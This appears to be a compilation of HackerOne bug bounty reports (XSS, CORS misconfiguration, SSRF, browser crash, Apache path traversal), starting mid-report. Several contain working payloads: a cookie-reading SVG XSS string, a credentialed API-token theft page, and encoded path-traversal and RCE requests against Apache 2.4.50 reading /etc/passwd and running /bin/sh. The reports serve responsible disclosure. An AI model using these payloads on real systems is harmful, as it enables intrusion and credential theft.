+If you implement more integrations in the future, the damage and the attack surface will grow significantly. Worst if you implement someday something like Login with Facebook / Login with Google / etc., because this bug will lead to account takeover.
+Fix:
+1) Protection against CSRF at the beginning of the OAuth flow:
+e.g.:
+Code 79 Bytes
+1GET https://hackerone.com/auth/slack?CSRF_TOKEN=bdea53bd9a8c73bd983847 HTTP/1.1
+2) Phabricator approach of OAuth connections (a confirmation dialog after the end of the OAuth flow). Picture attached (F121473).
+P.S.: Are you interested in Login XSRF in HackerOne?
+How do you protect users against Login XSRF in your SSO flow?
+Sorry, I can not fully test SSO because I need approval of SSO configuration every time.
+
+
+
+==================================================
+
+Report File: 901377.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: LOW
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- Cross-site Scripting (XSS) - Stored
+
+Contents:
+
+Summary:
+Stored XSS vulnerability exists at ██████████userprofile.aspx under "say something about yourself...". XSS can be used for a variety of attacks.
+Impact
+XSS can be used to steal cookies, password or to run arbitrary code in the victim's browser.
+Step-by-step Reproduction Instructions
+Create an account at ███████
+Go to your profile at ████userprofile.aspx
+Go to "Say something about yourself..." and enter the XSS payload xxx<svg/onload=alert(document.cookie);>xxx
+Observe that XSS triggers and reload the page to observe that it is stored XSS.
+Product, Version, and Configuration (If applicable)
+███userprofile.aspx#
+Suggested Mitigation/Remediation Actions
+Use secure coding techniques such as sanitizing input into form fields so attackers cannot inject scripts to perform XSS attacks. XSS vulnerabilities come from a lack of data escaping.
+References
+https://hackerone.com/reports/858255
+https://dzone.com/articles/reflected-xss-explained-how-to-prevent-reflected-x
+https://www.imperva.com/learn/application-security/reflected-xss-attacks/
+https://www.hacksplaining.com/prevention/xss-reflected
+Impact
+XSS can be used to steal cookies, password or to run arbitrary code in the victim's browser.
+
+
+
+==================================================
+
+Report File: 904671.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- Information Disclosure
+
+Contents:
+
+Summary:
+An adversary is able to view/modify requests and approvals via ████████/████████.
+Step-by-step Reproduction Instructions
+Browse to █████ and create an account or sign in.
+Browse to ███████/██████████. You can now view current/past requests.
+Clicking on these requests seems to allow an adversary to update/create changes/send e-mails, as well as attach files to the requests. I did not test these features as I did not want to impact existing requests, however I believe the ability to view these requests is enough of a security issue by itself as it allows an attacker to identify hardware/software specifications for NIPR/SIPR assets, as well as identifying justifications for the requests (upcoming TDYs, etc.)
+Suggested Mitigation/Remediation Actions
+Restrict access to this endpoint to only allow administrators to view requests as well as allowing users to view their own requests or the requests of users in the same workgroup.
+Impact
+An adversary can identify hardware/software specifications of NIPRNET/SIPRNET assets. Additionally, an adversary can gather intel based on justification requirements in the requests (upcoming TDYs, deployments, mission posture due to COVID, etc.)
+
+
+
+==================================================
+
+Report File: 733017.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Vulnerable Asset: https://██████/█████████/
+Discovery:
+Upon accessing the site we discover two specific response headers which indicates that a cross-domain request for sensitive information might be possible
+Access-Control-Allow-Origin: injectable
+Access-Control-Allow-Credentials: true
+We craft a POC below and exploit the misconfigurations present by exposing the users API key, email, first name, last name, etc.
+███
+POC:
+This is hosted on http://█████████
+Code 265 Bytes
+1<html>
+2<script>
+3  var xhttp = new XMLHttpRequest();
+4  <!-- the below endpoint lists API tokens previously generated by the user -->
+5  xhttp.open("GET", "https://█████/████/api/token/list", true);
+6  xhttp.withCredentials = true;
+7  xhttp.send(null);
+8</script>
+9</html>
+Demo:
+███████
+Remediations:
+Do not allow the Access-Control-Allow-Origin to be arbitrarily set by the user; the domain should be whitelisted that is allowed access to CORS, or the wildcard operator * should be used instead, which will disallow the Allow-Credentials header
+Impact
+This attack works similarly to a CSRF attack in that an attacker would need to have a victim visit the attacker's website in order to trigger the exploit. If the victim is logged in, then the result is full access to API keys which serve in lieu of username/password as shown in the demo. The attacker then can perform any action within the user's account that the API allows.
+
+
+
+==================================================
+
+Report File: 264481.json
+------------------------------
+Report To: Tor
+Severity: HIGH
+Complexity: LOW
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- Stack Overflow
+
+Contents:
+
+I reported this bug to Mozilla approximately 9 months ago and all versions of Firefox back to at least ESR45 and including current Nightly 57 builds are still vulnerable to this unpatched flaw. I've tested on Fedora 26, Debian 8, Windows 8 and Windows 10. Mozilla declined to award a bounty.
+Code:
+Code 205 Bytes
+1<html>
+2<head></head>
+3<body>
+4<script>
+5function done() {
+6}
+7
+8var x = '';
+9for (i=0; i<500000; ++i)
+10  x += '<a>';
+11var uri = 'data:image/svg+xml,' + x;
+12var i = new Image();
+13i.src = uri;
+14</script>
+15</body>
+16</html>
+The caveat to this is that if scripts are disabled on the page where this code is located, the Tor browser won't crash. This link will probably crash your Firefox. A WinDBG stack trace is located here.
+
+
+
+==================================================
+
+Report File: 2585378.json
+------------------------------
+Report To: Internet Bug Bounty
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Improper Input Validation
+
+Contents:
+
+I reported this vulnerability through the official Apache HTTP Server security email on April 1, 2024, and received a fix along with a CVE number on July 1, 2024. You can check detailed information from there:
+https://httpd.apache.org/security/vulnerabilities_24.html
+Impact
+Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.
+Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.
+
+
+
+==================================================
+
+Report File: 2262382.json
+------------------------------
+Report To: HackerOne
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Server-Side Request Forgery (SSRF)
+
+Contents:
+
+Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability.
+Proof of concept
+███
+Impact
+SSRF.
+Thanks and have a nice day!
+
+
+
+==================================================
+
+Report File: 1404731.json
+------------------------------
+Report To: Internet Bug Bounty
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Path Traversal: '.../...//'
+
+Contents:
+
+Hello Apache team,
+@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.
+These are the payloads:
+1) %%32%65%%32%65
+2) .%%32%65
+3) .%%32e
+4) .%2%65
+PoC Path Traversal
+GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
+Host: localhost:83
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+PoC RCE
+POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Host: 192.168.88.201
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,es;q=0.8
+If-None-Match: "2aa6-5cda88e8a6005-gzip"
+If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
+Connection: close
+Content-Length: 60
+echo Content-Type: text/plain; echo; id; uname;apache2ctl -M
+Impact
+An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.
+If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.
+
+
+
+==================================================
+
